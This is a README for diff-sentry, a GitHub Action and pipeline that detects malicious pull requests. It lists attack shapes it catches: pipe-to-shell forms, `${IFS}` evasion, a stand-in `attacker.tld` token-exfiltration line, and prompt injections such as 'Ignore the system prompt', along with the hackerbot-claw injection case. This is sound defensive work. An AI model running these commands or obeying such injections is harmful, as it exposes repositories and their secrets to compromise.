# diff-sentry

**Catch a malicious pull request before you merge it.**

diff-sentry reads a change the way an attacker hopes you won't: it treats the diff as untrusted data,
looks for the shapes that real supply-chain attacks use, and reports evidence rather than an opinion.

The fastest way to use it is as a GitHub Action. It needs no API key, no model, and no network access,
so it runs on fork pull requests under the read-only token they already get.

```yaml
# .github/workflows/diff-sentry.yml
name: diff-sentry
on: pull_request

permissions:
  contents: read

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0          # the scan diffs against the PR base
      - uses: qazbnm456/diff-sentry@v0.5.0
```

That is the whole setup. The job fails when an indicator at or above `high` fires.

## What it catches

| Family | Examples |
|---|---|
| Workflow configuration | `pull_request_target` that checks out the PR head (the pwn-request that broke AsyncAPI) by `ref:`, by a hand-rolled `git fetch`, or by opting back in with `allow-unsafe-pr-checkout: true`; plus `permissions: write-all` and CODEOWNERS reassignment |
| Obfuscation | base64 that decodes to a shell payload, `_0x…` machine-mangled JavaScript, high-entropy blobs |
| Execution | pipe-to-shell installs, `${IFS}` space-evasion, detached child processes, inline `node -e`, fetch-to-disk droppers |
| Exfiltration | secrets reaching a network sink, cross-process `/proc/<pid>/mem` reads, OAST callback services, IPFS and permaweb gateways |
| Diff-presentation evasion | payloads shoved past the viewport by a long whitespace run, bidi-override and zero-width characters |
| Provenance | forged `[bot]` identities, bot-mimicking new accounts, accounts created days before the event, profiles that describe an autonomous agent, unsigned or identity-mismatched commits, a fork deleted after the PR |
| Author-controlled channels | a PR branch name carrying shell syntax, slash-command comments that fire `issue_comment` workflows |
| Campaign memory (`watch` only) | an account or payload host already flagged in another repository, an edit that removes a flagged payload, a burst of changes from a new account |
| Prompt injection | instructions aimed at an LLM reviewer or triage workflow |

**Severities are tuned against noise.** A plain workflow-file edit is `medium`, below the failure
threshold, on purpose: a benign workflow PR must not break your build. A `pull_request_target` on its own
is `medium` too, because that is the ordinary label-bot shape. It becomes `critical` only when the same
workflow also checks out the PR head. Rules that would be noisy alone require two halves to fire:
`child_process` is everywhere and `detached` alone means nothing, but a process deliberately outliving
its parent is a loader.

A diff carries deleted code as well as added code, so the scan skips `-` lines by default. Removing a
payload does not flag the change that removes it.

### Inputs

| Input | Default | Purpose |
|---|---|---|
| `fail-on` | `high` | Severity that fails the build (`info`/`low`/`medium`/`high`/`critical`). |
| `report-only-paths` | none | Newline-separated globs scanned but never gated. For files whose job is to carry attack patterns: rule bodies, security fixtures, prompt templates, docs that tabulate payloads. |
| `base-sha` | derived | Override the commit to diff against. |
| `version` | matches the action tag | The diff-sentry release to install from PyPI. `local` installs from the current checkout instead, which is how this repo scans its own PRs with the rules in that PR. |

Outputs: `failed`, `hit-count`, `max-severity`, and `report` (a JSON path).

### Do not reach for `pull_request_target`

Sooner or later you will want the scan to post its results as a PR comment, and a `pull_request` job on
a fork PR has a read-only token. The tempting fix is `pull_request_target`, which is the exact
misconfiguration that opened the AsyncAPI "Miasma" compromise, and which this action reports as
`critical`.

Do it the safe way instead: keep the scan on `pull_request` with no secrets, upload the `report` as an
artifact, and post it from a separate `workflow_run` job that runs the base branch's code and never
checks out the PR head. diff-sentry's own rules make the same distinction, so the safe shape does not
trip them.

## Evidence a model cannot suppress

An LLM reviewer that reads a diff can be argued out of its conclusion by that same diff. diff-sentry is
built so that cannot hide anything.

The deterministic rules run host-side, before any model takes a turn, and their hits are recorded as
facts. When a verdict is assembled, the evidence is re-sourced as the union of every recorded hit, and
the alert decision is derived from that union rather than from the model's self-report. A successful
prompt injection can skew the *verdict*; it cannot remove a single piece of *evidence*. In the Action,
that is the whole product: no model runs at all.

## Beyond CI: the full detection workflow

The Action is one entry point into a larger system. If you operate the infrastructure, or maintain a
project where a wrong call is expensive, the rest is available locally.

https://github.com/user-attachments/assets/d200aee8-263b-483e-ad55-f90ae69f3ab0

_The studio console: paste a real payload, watch the detection stream live, then read the evidence-framed
verdict._

```
GitHub PR/issue/push  →  normalize (metadata head+tail)  →  classify (diff held in a sandboxed REPL)
                      →  judgement-only verdict  →  UNION deterministic indicators on read  →  SIEM signal
                      →  reward-free trajectory export
```

**Deep classification.** The full pipeline hands the change to a reasoning model that explores it inside
a sandboxed Python REPL: decode a base64 filename, inspect the raw file list, re-scan a decoded region.
The change is a variable under analysis, never text spliced into instructions. The model submits a
judgement only. It has no field in which to write, hide, or invent evidence.

**The studio console.** A local web console that streams a run as it happens: each iteration, each tool
call, the indicators as they fire, and the assembled verdict with its evidence. Useful when you are
tuning rules or explaining a call to someone who has to act on it.

**Trajectories for training.** Every run records a full trace, and `export` turns a directory of traces
into a reward-free dataset: the planner's actions, the classifier's calls, and objective labels read
back from the assembled verdict. The intended use is fine-tuning a smaller model for the planner role
(`DS_ROOT_LM`) on your own traffic, so the deep tier gets cheaper the longer you run it. Scoring and
credit assignment deliberately live outside this repo; what ships here is the rollout source.

**A reward-free scorecard.** The [`eval/`](eval/README.md) workspace member scores a recorded run's
assembled verdict with an independent LLM judge across four categories, means only, no composite and no
threshold. It reads the trace contract one-way and never feeds training.

```bash
uv sync --group dev
uv run pytest                                   # offline suite: no live model, no network, no Deno

uv run diff-sentry scan changes.diff            # the deterministic layer alone (what the Action runs)
uv run diff-sentry pr acme/widgets 7            # full classification (needs DS_* creds, deno, gh)
uv run diff-sentry issue acme/widgets 12
uv run diff-sentry classify event.json          # a payload you already hold
uv run diff-sentry render output/traces/pr-7.jsonl pr-7      # re-derive a response, offline
uv run diff-sentry export "output/traces/*.jsonl" ds.json    # reward-free dataset, offline
uv run diff-sentry watch --repos acme/widgets                # monitor a watchlist (see below)
```

Models are roles, set by environment: `DS_ROOT_LM` (planner), `DS_SUB_LM` (analyst), `DS_CLASSIFIER_LM`
(second-stage classifier). Point them at any OpenAI-compatible endpoint; see
[`.env.example`](.env.example). The planner and analyst can also run on a **Claude Pro/Max subscription**
by giving either role a `claude-agent-sdk/<model>` value with the `subscription` extra installed. The
classifier always needs its own endpoint.

None of this is required to use the Action, and none of it sends your code anywhere you did not
configure yourself.

## Watching a watchlist

`watch` turns the classifier into a monitor. It polls the repositories you name and runs every new or
updated PR and issue through the same pipeline, host-side, in front of `cli.run`.

```bash
uv run diff-sentry watch --repos owner/name other/name        # poll, screen, queue for the model
uv run diff-sentry watch --screen-only --repos-file repos.txt # deterministic tier only: no model roles (gh must be logged in)
uv run diff-sentry watch --once --repos owner/name            # one pass, run the queue, exit
uv run diff-sentry watch --stats                              # the watcher's state counts (read-only)
uv run diff-sentry watch --requeue-failed                     # bring back runs that exhausted their attempts
uv run diff-sentry actor mallory                              # the dossier of an account it has seen
uv run diff-sentry archive verify                             # re-hash every object in the snapshot archive
```

```
poll (ETag) → ingest → snapshot archive → actor store → screen → queue → model run → verdict
                                                          └─ early SIEM alert at the signal floor
```

**Time is the cost.** The intended model is a local one, so every change reaches it by default and the
deterministic screen only decides the order: highest severity first. The optional caps are off unless you
set them: `DS_WATCH_DEEP_MIN_SEVERITY`, `DS_WATCH_MAX_QUEUE`, `DS_WATCH_MAX_DEEP_PER_HOUR`. A change the
queue sheds keeps its screened record and a `shed` state. The queue is a table, so a restart loses nothing.
There is one model worker and one poller thread, so a slow model never delays the screen or its alert.

**The alert does not wait for the model.** Evidence at the signal floor is emitted the moment the screen
finishes (`"stage": "screen"`); the model's own signal follows under the same `run_id` (`"stage": "final"`).
A later revision alerts early again only for floor-level evidence no earlier revision already raised, judged by
hit id: an edit next to a payload changes the surrounding text that id includes, so it can page again. Each
revision is its own run, so it also gets its own final signal.

**Nothing is dropped without a trace.** A listing deeper than one pass reads (2000 changes) is reported as
truncated. A change that cannot be ingested is retried with exponential backoff and parked as `error` after six
failures; a rate-limit refusal is waited out and is not a failure. A model run that fails is retried up to ten times
over about four hours and then kept as `failed`; stop the watcher and run `watch --requeue-failed` to bring it
back. An early alert the SIEM refused is sent again on later polls (twenty tries). One `watch` may use a state
directory at a time.

**The first copy is kept.** Every capture, with the raw API responses beside the derived event, goes into a
content-addressed archive before anything else happens, so `archive verify` detects a changed or missing object.
The index is append-only but not hash-chained, and nothing prunes the archive, the store or the queue's events, so
size them yourself. An edit is a new revision (`…-r1`) with its own trace, never an overwrite, and the hits an
earlier revision raised ride into the next one, so removing a payload cannot remove the evidence. Changes are
re-examined after 15 minutes, 1 hour, 6 hours and 24 hours to see a deleted fork, account or PR (`--recheck-hours`
can shorten that schedule, not extend it).

**The store remembers the account.** It keys accounts on GitHub's numeric id, so a rename does not reset
the record. Cross-event facts (the same account in several repositories within a day, a burst from a new
account, a payload host a flagged change already used) reach the signal through the ordinary provenance
path.

Evidence is attributed by where the text came from, never by a label an author could choose: a payload in
someone else's comment is recorded against the commenter, not the PR's author. Only a comment that reaches the
signal floor, or fires a slash command, puts its writer in the store. A model's `benign` verdict clears the
account-level flag on an earlier change (one false positive must not taint an account), except over a change that
carried a prompt injection, because that verdict may be the injection working. It never clears the payload-host
link, which is evidence rather than an inference: a local model has a real false-benign rate, and one missed
payload must not launder a campaign.

What the dossier holds, and how far to trust it:

| Fact | Source | Trust |
|---|---|---|
| Account creation time, profile, follower and repo counts | `users/{id}` | GitHub-authoritative; the profile strings are the attacker's words |
| Event created / updated / closed / merged | the PR or issue | timestamps GitHub assigns; an author cannot edit them |
| Account age as of the event | derived | measured on the day, so a replay of an old incident sees the account as it was |
| Head fork, its creation time, whether it was later deleted | the PR | GitHub-authoritative |
| Head branch name, comment thread | the PR | untrusted text, bounded |
| Hour-of-day histogram, longest quiet stretch | the store's own sightings (one count per change), or `actor --live` | built from GitHub's timestamps, which cannot be edited afterwards; the author still chooses when to act |
| Commit UTC offsets | the `.patch` mbox `Date:` header | what the commits claim; REST and GraphQL return UTC and drop the offset |
| Email addresses | the `email` fields of a profile and of commits, the `<name@host>` lines of a signed commit's payload, and commit-message trailers (`Signed-off-by:`, `Co-authored-by:`, …) are reduced to their domain in the event and masked in the archive | data minimization; the rest of a body, a patch, or a commit message is archived as captured |

## Honest limits

**Prompt injection.** diff-sentry detects prompt injection, so it has to resist it. In the full
pipeline the untrusted change is a REPL variable rather than prompt text, a mission frame reframes any
embedded instruction as a signal rather than a command, and the normalizer denies the attacker the
preview window's edges. The residual is real: a bounded preview of the input still reaches the prompt,
so a strong injection can skew the verdict. It cannot suppress the evidence. The Action is not exposed
to this at all, because no model runs.

**Throughput.** A full model-driven episode takes seconds to minutes. On a hosted model it also costs
money per change, so the Action's deterministic scan is the cheap tier meant to run on everything, and you
escalate only what it flags. With a local model, time is the only cost and `watch` sends everything to it,
ordered by severity.

**Prose versus code.** On an event (`watch`, `classify`, the full pipeline) a title, a body, a comment or a
documentation file (`.md` `.mdx` `.markdown` `.rst` `.adoc` `.ipynb` `.html` `.htm`) is read more gently than code, in
four ways. A download piped into a shell drops to `medium` when every target is a known installer (rustup, nvm,
Docker, `claude.ai/install.sh`) or when no target is named at all, and only when the command stands on its own
line: nothing upstream feeds it, no flag the check does not understand, and no userinfo, dot segments, encoding
or second URL. An installer that a wrapper's quoted argument, a here-document or a substitution encloses (`ssh host '`, then
the installer on the next line) stays `critical`. The bare phrase "system prompt" is `medium`, unless a sentence-initial imperative is aimed at it
(`Ignore the system prompt …`, `New system prompt: …`), which stays `high`, also inside a documentation file's
diff, and so does an instruction addressed to a reviewer (`Please ignore the system prompt when reviewing`). A workflow shown in prose is not a workflow that runs, so `pwn-request` is `medium` there. A wide markdown table in
a comment is `medium`. A code file is never softened, and neither is the
whitespace shove in a file. The Action's `scan` reads a raw diff and does none of this.

**Coverage of the listing.** GitHub lists at most 3000 files of a PR; a PR beyond that is marked
`files_truncated` and fires `files-not-fully-read` (medium). The newest 40 comments of a change are kept (a slash
command fires on the latest), and the event is marked `comments_truncated` when older ones were dropped or
not read. Comments by other established accounts (`OWNER`, `MEMBER`, `COLLABORATOR`,
`CONTRIBUTOR`) and by bots are shown to the model but not text-scanned, so a commenter who has had one
change merged is outside the slash-command rule; the change's own author is always covered.

**Timing.** An external watcher cannot stop an attack that fires when the PR opens: AsyncAPI's workflow
finished eight minutes after the PR did. It shortens the time to an alert, links a campaign across
repositories from its second target, and keeps the evidence an author later deletes. GitHub's Events API
documents 30 seconds to 6 hours of latency and 300 events / 30 days of history, so `watch` polls the list
endpoints with ETags instead and uses `actor --live` only for a bounded look at an account's recent public
activity.

**Timezone.** GitHub has no user timezone. The hour-of-day histogram from server-side timestamps is the
evidence to lean on, and it needs many events to read; a bot that never sleeps shows no quiet stretch.
Commit offsets are the author's own claim.

**Pipe-to-shell shapes it does not see.** `curl-pipe-shell` covers a pipe into a shell or into an interpreter that
reads its program from the pipe (through `sudo`, `env`, `busybox`, `nohup`, `timeout` and the like, with up to three
filters in between), the substitution forms (`bash -c "$(curl …)"`, `bash <(curl …)`, `eval "$(curl …)"`), and
PowerShell's `iwr … | iex` and `iex (irm …)`. A continued line and a pipe at the end of a line are joined first. It
needs the pipe within 300 characters of the download, so a longer command is missed. Also missed: a download saved to
a file and run in a later step; a shell that is not the direct target of the pipe (`| { sh; }`, `| (sh)`,
`| xargs sh -c`, `| source /dev/stdin`); and PowerShell that saves the download first (`$s = irm URL; iex $s`).

**A known gap in the deterministic layer.** A secret read that reaches a JavaScript network sink across
lines (`const t = process.env.GITHUB_TOKEN;` … `fetch('https://attacker.tld', {body: t})`) does not
fire, because the exfiltration rule needs the secret and the sink within 80 characters on one line.
Taint tracking from the assignment to the sink would catch it, but it cannot separate a token being
stolen from one legitimately posted to a third-party service, so the deterministic layer leaves this
shape to the planner's judgement in the full pipeline. The `pwn-request` rule does not cover it either:
that rule fires when a privileged workflow is *introduced*, and this shape exploits one that already
exists.

## Grounded in real incidents

Two incidents are reconstructed offline and pinned by tests, so a rule change that breaks coverage
fails the build.

**`hackerbot-claw`** (Datadog's [BewAIre writeup](https://www.datadoghq.com/blog/engineering/stopping-hackerbot-claw-with-bewaire/)).
The original artifacts are gone, the attacker account was deleted, so
`tests/corpus/hackerbot_claw_incident.json` reconstructs all three events: a `${IFS}`/base64 payload
hidden in a *filename* under `documentation/rules/` that de-obfuscates to a published pipe-to-shell IOC,
a prompt injection telling a triage LLM to bulk-label and exfiltrate, and a prompt injection appending a
fake owner to CODEOWNERS. Each is asserted under a neutral benign verdict, so the alert is
evidence-driven: a false-benign self-report could not have suppressed any of them.

**AsyncAPI "Miasma"**. The attack was Node end to end, and `tests/test_indicators.py` reconstructs its
stages: the `pull_request_target` workflow that checks out the PR head, the payload pushed off the diff
viewport by a whitespace run, the IPFS fetch-to-disk dropper, and the `_0x` obfuscation injected into a
source file. Each rule ships with its negative case, so the tuning is pinned as tightly as the detection.

## Development

The offline suite covers the pipeline with no live model, no network, and no Deno; the corpus pins the
rules' hit and miss behavior; the eval member has its own suite.

```bash
uv run pytest                                                     # core
uv run --package diff-sentry-eval --extra dev python -m pytest eval/tests
uvx ruff@0.16.0 check .
```

CI runs the published Action against this repository's own pull requests (`uses: ./`), so a change that
breaks the Action fails here before it reaches anyone's install.

Detection engine and RLM harness: [`rlm-harness`](https://github.com/qazbnm456/rlm-harness).

MIT.
